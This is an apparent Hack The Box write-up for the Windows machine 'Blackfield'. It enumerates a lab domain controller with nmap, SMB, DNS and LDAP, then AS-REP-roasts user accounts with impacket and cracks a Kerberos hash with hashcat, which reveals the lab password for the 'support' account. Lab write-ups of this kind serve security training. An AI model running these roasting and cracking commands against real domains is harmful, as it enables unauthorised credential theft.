---
title: "[HTB] Machine: Blackfield"
description: "[HTB] Machine: Blackfield"
date: 2023-09-17
menu:
  sidebar:
    name: "[HTB] Machine: Blackfield"
    identifier: htb-machine-Blackfield
    parent: htb-machines-windows
    weight: 10
hero: images/blackfield.png
tags: ["HTB"]
---

# Blackfield
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.192 --min-rate 5000 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:54 BST
Nmap scan report for 10.10.10.192 (10.10.10.192)
Host is up (0.11s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 35.69 seconds

```
```
└─$ nmap -Pn -p53,88,135,389,445,593,3268,5985 -sC -sV 10.10.10.192 --min-rate 5000 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:56 BST
Nmap scan report for 10.10.10.192 (10.10.10.192)
Host is up (0.15s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-18 00:55:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m20s
| smb2-time: 
|   date: 2023-09-18T00:55:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.42 seconds

```
- `smb`
```
└─$ smbclient -N -L //10.10.10.192                                  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

- `dns`
```
└─$ sudo vim /etc/hosts                                                                                                     
[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/tasks]
└─$ dig  @10.10.10.192 BLACKFIELD.local                                                                                     

; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26635
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;BLACKFIELD.local.              IN      A

;; ANSWER SECTION:
BLACKFIELD.local.       600     IN      A       10.10.10.192

;; Query time: 95 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Sun Sep 17 19:03:32 BST 2023
;; MSG SIZE  rcvd: 61

```
```
└─$ dig axfr @10.10.10.192 BLACKFIELD.local 

; <<>> DiG 9.18.16-1-Debian <<>> axfr @10.10.10.192 BLACKFIELD.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
- `ldap`
```
└─$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
```
└─$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=BLACKFIELD,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

## Foothold
- `smb`
```
└─$ smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 17:47:12 2020
  ..                                  D        0  Wed Jun  3 17:47:12 2020
  AAlleni                             D        0  Wed Jun  3 17:47:11 2020
  ABarteski                           D        0  Wed Jun  3 17:47:11 2020
  ABekesz                             D        0  Wed Jun  3 17:47:11 2020
  ABenzies                            D        0  Wed Jun  3 17:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 17:47:11 2020
  AChampken                           D        0  Wed Jun  3 17:47:11 2020
  ACheretei                           D        0  Wed Jun  3 17:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 17:47:11 2020
  AHigchens                           D        0  Wed Jun  3 17:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 17:47:11 2020
  AKlado                              D        0  Wed Jun  3 17:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 17:47:11 2020
  AKollolli                           D        0  Wed Jun  3 17:47:11 2020
  AKruppe                             D        0  Wed Jun  3 17:47:11 2020
  AKubale                             D        0  Wed Jun  3 17:47:11 2020
  ALamerz                             D        0  Wed Jun  3 17:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 17:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 17:47:11 2020
  ANavay                              D        0  Wed Jun  3 17:47:11 2020
  ANesterova                          D        0  Wed Jun  3 17:47:11 2020
  ANeusse                             D        0  Wed Jun  3 17:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 17:47:11 2020
  APustulka                           D        0  Wed Jun  3 17:47:11 2020
  ARotella                            D        0  Wed Jun  3 17:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 17:47:11 2020
  AShadaia                            D        0  Wed Jun  3 17:47:11 2020
  ASischo                             D        0  Wed Jun  3 17:47:11 2020
  ASpruce                             D        0  Wed Jun  3 17:47:11 2020
  ATakach                             D        0  Wed Jun  3 17:47:11 2020
  ATaueg                              D        0  Wed Jun  3 17:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 17:47:11 2020
  audit2020                           D        0  Wed Jun  3 17:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 17:47:11 2020
  AWorsey                             D        0  Wed Jun  3 17:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 17:47:11 2020
  BBakajza                            D        0  Wed Jun  3 17:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 17:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 17:47:11 2020
  BConsultant                         D        0  Wed Jun  3 17:47:11 2020
  BErdossy                            D        0  Wed Jun  3 17:47:11 2020
  BGeminski                           D        0  Wed Jun  3 17:47:11 2020
  BLostal                             D        0  Wed Jun  3 17:47:11 2020
  BMannise                            D        0  Wed Jun  3 17:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 17:47:11 2020
  BRigiero                            D        0  Wed Jun  3 17:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 17:47:11 2020
  BZandonella                         D        0  Wed Jun  3 17:47:11 2020
  CAcherman                           D        0  Wed Jun  3 17:47:12 2020
  CAkbari                             D        0  Wed Jun  3 17:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 17:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 17:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 17:47:12 2020
  CGronk                              D        0  Wed Jun  3 17:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 17:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 17:47:12 2020
  CHoytal                             D        0  Wed Jun  3 17:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 17:47:12 2020
  CKolbo                              D        0  Wed Jun  3 17:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 17:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 17:47:11 2020
  CSchandall                          D        0  Wed Jun  3 17:47:12 2020
  CSelters                            D        0  Wed Jun  3 17:47:12 2020
  CTolmie                             D        0  Wed Jun  3 17:47:12 2020
  DCecere                             D        0  Wed Jun  3 17:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 17:47:12 2020
  DCwilich                            D        0  Wed Jun  3 17:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 17:47:12 2020
  DKemesies                           D        0  Wed Jun  3 17:47:12 2020
  DMatuka                             D        0  Wed Jun  3 17:47:12 2020
  DMedeme                             D        0  Wed Jun  3 17:47:12 2020
  DMeherek                            D        0  Wed Jun  3 17:47:12 2020
  DMetych                             D        0  Wed Jun  3 17:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 17:47:12 2020
  DPriporov                           D        0  Wed Jun  3 17:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 17:47:12 2020
  DVellela                            D        0  Wed Jun  3 17:47:12 2020
  DVogleson                           D        0  Wed Jun  3 17:47:12 2020
  DZwinak                             D        0  Wed Jun  3 17:47:12 2020
  EBoley                              D        0  Wed Jun  3 17:47:12 2020
  EEulau                              D        0  Wed Jun  3 17:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 17:47:12 2020
  EFrixione                           D        0  Wed Jun  3 17:47:12 2020
  EJenorik                            D        0  Wed Jun  3 17:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 17:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 17:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 17:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 17:47:12 2020
  EPryar                              D        0  Wed Jun  3 17:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 17:47:12 2020
  ESariotti                           D        0  Wed Jun  3 17:47:12 2020
  ETurgano                            D        0  Wed Jun  3 17:47:12 2020
  EWojtila                            D        0  Wed Jun  3 17:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 17:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 17:47:12 2020
  FBroj                               D        0  Wed Jun  3 17:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 17:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 17:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 17:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 17:47:12 2020
  FPflum                              D        0  Wed Jun  3 17:47:12 2020
  FReffey                             D        0  Wed Jun  3 17:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 17:47:12 2020
  Gareld                              D        0  Wed Jun  3 17:47:12 2020
  GBatowski                           D        0  Wed Jun  3 17:47:12 2020
  GForshalger                         D        0  Wed Jun  3 17:47:12 2020
  GGomane                             D        0  Wed Jun  3 17:47:12 2020
  GHisek                              D        0  Wed Jun  3 17:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 17:47:12 2020
  GMerewether                         D        0  Wed Jun  3 17:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 17:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 17:47:12 2020
  GWiegard                            D        0  Wed Jun  3 17:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 17:47:12 2020
  HColantino                          D        0  Wed Jun  3 17:47:12 2020
  HConforto                           D        0  Wed Jun  3 17:47:12 2020
  HCunnally                           D        0  Wed Jun  3 17:47:12 2020
  HGougen                             D        0  Wed Jun  3 17:47:12 2020
  HKostova                            D        0  Wed Jun  3 17:47:12 2020
  IChristijr                          D        0  Wed Jun  3 17:47:12 2020
  IKoledo                             D        0  Wed Jun  3 17:47:12 2020
  IKotecky                            D        0  Wed Jun  3 17:47:12 2020
  ISantosi                            D        0  Wed Jun  3 17:47:12 2020
  JAngvall                            D        0  Wed Jun  3 17:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 17:47:12 2020
  JDanten                             D        0  Wed Jun  3 17:47:12 2020
  JDjouka                             D        0  Wed Jun  3 17:47:12 2020
  JKondziola                          D        0  Wed Jun  3 17:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 17:47:12 2020
  JLuthner                            D        0  Wed Jun  3 17:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 17:47:12 2020
  JPistachio                          D        0  Wed Jun  3 17:47:12 2020
  JScima                              D        0  Wed Jun  3 17:47:12 2020
  JSebaali                            D        0  Wed Jun  3 17:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 17:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 17:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 17:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 17:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 17:47:12 2020
  KCockeril                           D        0  Wed Jun  3 17:47:12 2020
  KColtart                            D        0  Wed Jun  3 17:47:12 2020
  KCyster                             D        0  Wed Jun  3 17:47:12 2020
  KDorney                             D        0  Wed Jun  3 17:47:12 2020
  KKoesno                             D        0  Wed Jun  3 17:47:12 2020
  KLangfur                            D        0  Wed Jun  3 17:47:12 2020
  KMahalik                            D        0  Wed Jun  3 17:47:12 2020
  KMasloch                            D        0  Wed Jun  3 17:47:12 2020
  KMibach                             D        0  Wed Jun  3 17:47:12 2020
  KParvankova                         D        0  Wed Jun  3 17:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 17:47:12 2020
  KRasmor                             D        0  Wed Jun  3 17:47:12 2020
  KShievitz                           D        0  Wed Jun  3 17:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 17:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 17:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 17:47:12 2020
  KZyballa                            D        0  Wed Jun  3 17:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 17:47:12 2020
  LBaligand                           D        0  Wed Jun  3 17:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 17:47:12 2020
  LBirer                              D        0  Wed Jun  3 17:47:12 2020
  LBobelis                            D        0  Wed Jun  3 17:47:12 2020
  LChippel                            D        0  Wed Jun  3 17:47:12 2020
  LChoffin                            D        0  Wed Jun  3 17:47:12 2020
  LCominelli                          D        0  Wed Jun  3 17:47:12 2020
  LDruge                              D        0  Wed Jun  3 17:47:12 2020
  LEzepek                             D        0  Wed Jun  3 17:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 17:47:12 2020
  LKarabag                            D        0  Wed Jun  3 17:47:12 2020
  LKirousis                           D        0  Wed Jun  3 17:47:12 2020
  LKnade                              D        0  Wed Jun  3 17:47:12 2020
  LKrioua                             D        0  Wed Jun  3 17:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 17:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 17:47:12 2020
  LMichoud                            D        0  Wed Jun  3 17:47:12 2020
  LTindall                            D        0  Wed Jun  3 17:47:12 2020
  LYturbe                             D        0  Wed Jun  3 17:47:12 2020
  MArcynski                           D        0  Wed Jun  3 17:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 17:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 17:47:12 2020
  MBrambini                           D        0  Wed Jun  3 17:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 17:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 17:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 17:47:12 2020
  MKillberg                           D        0  Wed Jun  3 17:47:12 2020
  MLapesh                             D        0  Wed Jun  3 17:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 17:47:12 2020
  MMerezio                            D        0  Wed Jun  3 17:47:12 2020
  MNaciri                             D        0  Wed Jun  3 17:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 17:47:12 2020
  MSichkar                            D        0  Wed Jun  3 17:47:12 2020
  MTemko                              D        0  Wed Jun  3 17:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 17:47:12 2020
  MTonuri                             D        0  Wed Jun  3 17:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 17:47:12 2020
  NBellibas                           D        0  Wed Jun  3 17:47:12 2020
  NDikoka                             D        0  Wed Jun  3 17:47:12 2020
  NGenevro                            D        0  Wed Jun  3 17:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 17:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 17:47:12 2020
  NPulido                             D        0  Wed Jun  3 17:47:12 2020
  NRonges                             D        0  Wed Jun  3 17:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 17:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 17:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 17:47:12 2020
  OBushey                             D        0  Wed Jun  3 17:47:12 2020
  OHardybala                          D        0  Wed Jun  3 17:47:12 2020
  OLunas                              D        0  Wed Jun  3 17:47:12 2020
  ORbabka                             D        0  Wed Jun  3 17:47:12 2020
  PBourrat                            D        0  Wed Jun  3 17:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 17:47:12 2020
  PBranti                             D        0  Wed Jun  3 17:47:12 2020
  PCapperella                         D        0  Wed Jun  3 17:47:12 2020
  PCurtz                              D        0  Wed Jun  3 17:47:12 2020
  PDoreste                            D        0  Wed Jun  3 17:47:12 2020
  PGegnas                             D        0  Wed Jun  3 17:47:12 2020
  PMasulla                            D        0  Wed Jun  3 17:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 17:47:12 2020
  PParakat                            D        0  Wed Jun  3 17:47:12 2020
  PProvencer                          D        0  Wed Jun  3 17:47:12 2020
  PTesik                              D        0  Wed Jun  3 17:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 17:47:12 2020
  PVirding                            D        0  Wed Jun  3 17:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 17:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 17:47:12 2020
  RBochare                            D        0  Wed Jun  3 17:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 17:47:12 2020
  RNemnich                            D        0  Wed Jun  3 17:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 17:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 17:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 17:47:12 2020
  RVallandas                          D        0  Wed Jun  3 17:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 17:47:12 2020
  RWissor                             D        0  Wed Jun  3 17:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 17:47:12 2020
  SAjowi                              D        0  Wed Jun  3 17:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 17:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 17:47:12 2020
  SBouzane                            D        0  Wed Jun  3 17:47:12 2020
  SChatin                             D        0  Wed Jun  3 17:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 17:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 17:47:12 2020
  SEulert                             D        0  Wed Jun  3 17:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 17:47:12 2020
  SGolds                              D        0  Wed Jun  3 17:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 17:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 17:47:12 2020
  SHauht                              D        0  Wed Jun  3 17:47:12 2020
  SHederian                           D        0  Wed Jun  3 17:47:12 2020
  SHelregel                           D        0  Wed Jun  3 17:47:12 2020
  SKrulig                             D        0  Wed Jun  3 17:47:12 2020
  SLewrie                             D        0  Wed Jun  3 17:47:12 2020
  SMaskil                             D        0  Wed Jun  3 17:47:12 2020
  Smocker                             D        0  Wed Jun  3 17:47:12 2020
  SMoyta                              D        0  Wed Jun  3 17:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 17:47:12 2020
  SReppond                            D        0  Wed Jun  3 17:47:12 2020
  SSicliano                           D        0  Wed Jun  3 17:47:12 2020
  SSilex                              D        0  Wed Jun  3 17:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 17:47:12 2020
  STousignaut                         D        0  Wed Jun  3 17:47:12 2020
  support                             D        0  Wed Jun  3 17:47:12 2020
  svc_backup                          D        0  Wed Jun  3 17:47:12 2020
  SWhyte                              D        0  Wed Jun  3 17:47:12 2020
  SWynigear                           D        0  Wed Jun  3 17:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 17:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 17:47:12 2020
  TCaffo                              D        0  Wed Jun  3 17:47:12 2020
  TCassalom                           D        0  Wed Jun  3 17:47:12 2020
  TEiselt                             D        0  Wed Jun  3 17:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 17:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 17:47:12 2020
  TKauten                             D        0  Wed Jun  3 17:47:12 2020
  TKnupke                             D        0  Wed Jun  3 17:47:12 2020
  TLintlop                            D        0  Wed Jun  3 17:47:12 2020
  TMusselli                           D        0  Wed Jun  3 17:47:12 2020
  TOust                               D        0  Wed Jun  3 17:47:12 2020
  TSlupka                             D        0  Wed Jun  3 17:47:12 2020
  TStausland                          D        0  Wed Jun  3 17:47:12 2020
  TZumpella                           D        0  Wed Jun  3 17:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 17:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 17:47:12 2020
  UPyrke                              D        0  Wed Jun  3 17:47:12 2020
  VBublavy                            D        0  Wed Jun  3 17:47:12 2020
  VButziger                           D        0  Wed Jun  3 17:47:12 2020
  VFuscca                             D        0  Wed Jun  3 17:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 17:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 17:47:12 2020
  VMarija                             D        0  Wed Jun  3 17:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 17:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 17:47:12 2020
  WSaldat                             D        0  Wed Jun  3 17:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 17:47:12 2020
  WZelazny                            D        0  Wed Jun  3 17:47:12 2020
  XBemelen                            D        0  Wed Jun  3 17:47:12 2020
  XDadant                             D        0  Wed Jun  3 17:47:12 2020
  XDebes                              D        0  Wed Jun  3 17:47:12 2020
  XKonegni                            D        0  Wed Jun  3 17:47:12 2020
  XRykiel                             D        0  Wed Jun  3 17:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 17:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 17:47:12 2020
  YKivlen                             D        0  Wed Jun  3 17:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 17:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 17:47:12 2020
  YPredestin                          D        0  Wed Jun  3 17:47:12 2020
  YSeturino                           D        0  Wed Jun  3 17:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 17:47:12 2020
  YVonebers                           D        0  Wed Jun  3 17:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 17:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 17:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 17:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 17:47:12 2020
  ZMiick                              D        0  Wed Jun  3 17:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 17:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 17:47:12 2020
  ZWausik                             D        0  Wed Jun  3 17:47:12 2020

                5102079 blocks of size 4096. 1697641 blocks available

```
```
└─$ smbclient -N //10.10.10.192/forensic 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```
- Each directory is empty
  - But we can use it to create a userlist and try `AS-REP`-roasting
```
└─$ impacket-GetNPUsers -usersfile users.list -dc-ip 10.10.10.192 blackfield.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
...
```
- Crack it with `hashcat`
  - `support:#00^BlackKnight`
```
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
...
$krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b644a032f41814413ebe39$b16365d416a55a510ac198406233651071444fb1de08ba43529cd7dad0a9ca5025653e234e9ee14f3cbafabb4a492089bfdf57e1b7e2328003154bafdb0bcea191020a3dce2f3aac242166054e1c32c90f2fc1f932f0c92a62bf3d30a1ce26539d5d0b14143f0e409b7c66eeefb1c7fc5c900b17595a083fb23ae675f82d9eae5b02fef0f5178b1f35ca50fd98b3f5adff177028626db9ccccbf841746a01fa7d734f9fbc6f91b62a9a676c1f188a48624c771b75652b4cf94df83849e7bdcb6b9797c4176c3e0e7327b41c3610fcb162b0279f313c79a06c9d3cb127f606198db65bf5c2bae16a91b5b9ec05e5337ef0c623eb2:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:1f10d897a1b6...623eb2
Time.Started.....: Sun Sep 17 19:11:50 2023 (13 secs)
Time.Estimated...: Sun Sep 17 19:12:03 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1089.9 kH/s (0.41ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14335488/14344385 (99.94%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #1*6)0 -> #!hrvert
Hardware.Mon.#1..: Util: 91%

Started: Sun Sep 17 19:11:49 2023
Stopped: Sun Sep 17 19:12:05 2023
                                     
```
